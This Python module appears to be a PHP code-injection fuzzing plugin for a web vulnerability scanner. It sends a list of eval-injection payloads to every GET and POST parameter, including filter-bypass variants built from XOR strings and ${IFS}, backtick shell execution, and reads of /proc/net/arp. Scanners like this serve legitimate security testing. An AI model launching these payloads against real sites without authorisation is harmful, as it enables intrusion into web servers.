import asyncio
from typing import List

from .mod import Mod, Page, Report
from .requester import Requester

payloads = [
    ("echo 114*514", "58596"),
    ("echo 114*514;", "58596"),
    ("echo 114*514?>", "58596"),
    ("echo`mount`?>", " on / type "),
    ("echo`mount`;", " on / type "),
    ("114514;echo 114*514", "58596"),
    ("114514;echo 114*514;", "58596"),
    ("114514;echo 114*514?>", "58596"),
    ("114514);echo 114*514", "58596"),
    ("114514);echo 114*514;", "58596"),
    ("114514);echo 114*514?>", "58596"),
    ("_);?>__>_<", "__>_<"),
    ("_);?>__>_>", "__>_>"),
    (");?>__>_<", "__>_<"),
    (");?>__>_>", "__>_>"),
    ("_)?>__>_<", "__>_<"),
    ("_)?>__>_>", "__>_>"),
    (")?>__>_<", "__>_<"),
    (")?>__>_>", "__>_>"),
    *[
        (pattern.format(end), "58596")
        for pattern in [
            "var_dump(114*514){}",
            "(var_dump)(114*514){}",
            "(v.a.r._.d.u.m.p)(114*514){}",
            "(']@]!@]@]'^'+!/~$(--')(114*514){}",
            "('_@_!__@_'^')!-~;*-/')(114*514){}",
            "('@@@66@@@'^'6!2iR5-0')(114*514){}",
        ]
        for end in [
            ";",
            ";#",
            "?>",
            ";?>",
        ]
    ],
    ("?><?=`echo 114${IFS}514`?>", "114 514"),
    ("?><?=`echo${IFS}114${IFS}514`?>", "114 514"),
    ("?><?=`echo$IFS$9ytyt$IFS$9here`?>", "ytyt here"),
    ("?><?=`nl$IFS$9/proc/net/arp`?>", "IP address"),
    ("?><?=114*514?>", "58596"),
    ("?>114<?=514?>", "114514"),
    ("printf(base_convert(75864600844,36,10))?>", "yuntong"),
    ("var_dump(current(localeconv()));", '"."'),
    ("var_dump(next(str_split(zend_version())));", '"."'),
    ("var_dump(chr(ord(crypt(serialize(array())))));", '"$"'),
    ("var_dump(end(str_split(hebrevc(crypt(next(hash_algos()))))));", '"1"'),
    ("print_r(current(localeconv()));", '"."'),
    ("print_r(next(str_split(zend_version())));", '"."'),
    ("print_r(chr(ord(crypt(serialize(array())))));", '"$"'),
    ("print_r(end(str_split(hebrevc(crypt(next(hash_algos()))))));", '"1"'),
]

payload_with_params = {
    ("include$_GET[daaa]?>", (("daaa", "/proc/net/arp"),), "IP address")
}


class PHPEvalFuzzMod(Mod):
    def __init__(self, requester: Requester):
        super().__init__()
        self.requeser = requester

    async def check(self, thing):
        if not isinstance(thing, Page) or (not thing.params and not thing.data):
            return 0
        return 1

    async def test_payloads(self, page, method, param_field, payloads):
        target_params = page.params if method == "GET" else page.data

        return await asyncio.gather(
            *[
                self.requeser.submit_to(
                    page.url,
                    method,
                    {k: payload if k == param_field else "asdf" for k in target_params},
                )
                for payload, _ in payloads
            ]
        )

    async def crack_by_method(self, page, method):
        reports: List[Report] = []
        target_params = page.params if method == "GET" else page.data
        if target_params is None:
            return []
        self._logger.info(f"开始测试{page}是否含有PHP代码执行的参数")
        for param in target_params:
            found = False
            result = await self.test_payloads(page, method, param, payloads)
            for (payload, payload_respond), resp in zip(payloads, result):
                if payload_respond not in resp.text:
                    continue
                reports.append(
                    Report(
                        msg=f"在页面 {page.url} 找到一个可以执行PHP命令的{method}参数{param}, payload为{payload}"
                    )
                )
                found = True
                break
            if found:
                continue
            result = await asyncio.gather(
                *[
                    self.requeser.submit_to(
                        page.url,
                        method,
                        {k: payload if k == param else "asdf" for k in target_params}
                        | dict(extra_params),
                    )
                    for payload, extra_params, _ in payload_with_params
                ]
            )
            for (payload, extra, payload_respond), resp in zip(
                payload_with_params, result
            ):
                if payload_respond not in resp.text:
                    continue
                reports.append(
                    Report(
                        msg=f"在页面 {page.url} 找到一个可以执行PHP命令的{method}参数{param}, payload为{payload}, 附加的params为{dict(extra)}"
                    )
                )
                found = True
                break

        return reports

    async def crack(self, page):
        assert isinstance(page, Page) and (page.params or page.data)
        reports_lists = await asyncio.gather(
            *[self.crack_by_method(page, method) for method in ["GET", "POST"]]
        )
        reports: List[Report] = [
            report for reports in reports_lists for report in reports
        ]

        return reports
